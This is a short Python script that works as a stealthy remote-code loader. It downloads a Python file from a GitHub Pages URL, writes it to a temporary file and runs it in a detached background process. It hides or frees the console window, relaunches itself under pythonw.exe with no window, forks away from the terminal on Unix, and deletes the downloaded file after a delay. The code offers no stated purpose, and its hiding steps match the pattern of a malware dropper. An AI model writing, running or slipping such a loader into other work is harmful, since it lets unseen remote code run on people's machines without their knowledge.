import shutil
import os
import sys
import tempfile
import requests
import subprocess
import platform
import time
import atexit

def close_terminal():
    """Force close the terminal window"""
    try:
        if platform.system() == 'Windows':
            # For Windows - completely hide and detach
            import ctypes
            kernel32 = ctypes.WinDLL('kernel32')
            user32 = ctypes.WinDLL('user32')
            hwnd = kernel32.GetConsoleWindow()
            if hwnd:
                user32.ShowWindow(hwnd, 0)  # SW_HIDE = 0
                kernel32.FreeConsole()  # Detach from console
        else:
            # For Linux/Mac - completely detach
            os.system('exit 0')  # Force terminal close
    except:
        pass

def main():
    REMOTE_SCRIPT_URL = "https://trustmeow.github.io/scripts/hp/menu.py"
    
    # Create temp file that persists
    temp_path = None
    try:
        fd, temp_path = tempfile.mkstemp(suffix='.py')
        os.close(fd)
        
        # Download script
        response = requests.get(REMOTE_SCRIPT_URL)
        response.raise_for_status()
        with open(temp_path, 'wb') as f:
            f.write(response.content)
        
        # Make executable on Unix
        if platform.system() != 'Windows':
            os.chmod(temp_path, 0o755)
        
        # Close terminal before execution
        close_terminal()
        
        # Execute in new detached process
        if platform.system() == 'Windows':
            subprocess.Popen([sys.executable, temp_path], 
                            creationflags=subprocess.CREATE_NO_WINDOW)
        else:
            subprocess.Popen(['nohup', sys.executable, temp_path, '&'],
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL,
                            stdin=subprocess.DEVNULL)
        
    except Exception as e:
        print(f"Error: {str(e)}")
    finally:
        # Delayed cleanup
        def cleanup():
            time.sleep(5)
            try:
                if temp_path and os.path.exists(temp_path):
                    os.unlink(temp_path)
            except:
                pass
        atexit.register(cleanup)

if __name__ == "__main__":
    # Windows specific handling
    if platform.system() == 'Windows':
        if not sys.executable.endswith('pythonw.exe'):
            # Restart with pythonw.exe for complete silence
            subprocess.Popen([sys.executable.replace('python.exe', 'pythonw.exe')] + sys.argv,
                           creationflags=subprocess.CREATE_NO_WINDOW)
            sys.exit(0)
    
    # Unix fork and exit parent
    if platform.system() != 'Windows' and os.fork():
        sys.exit(0)
    
    main()

